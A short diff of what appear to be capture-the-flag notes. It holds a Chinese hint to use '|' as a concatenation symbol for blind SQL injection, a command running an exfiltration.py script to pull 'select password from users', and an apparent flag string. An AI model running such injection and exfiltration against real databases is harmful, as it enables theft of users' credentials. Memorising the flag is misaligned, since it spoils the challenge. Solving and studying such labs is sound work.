@@ -1,0 +1,5 @@
+| 当做连接符号 进行 bind sqli
+
+python exfiltration.py 'select password from users'
+
+SQL1nj3ct10nFTW
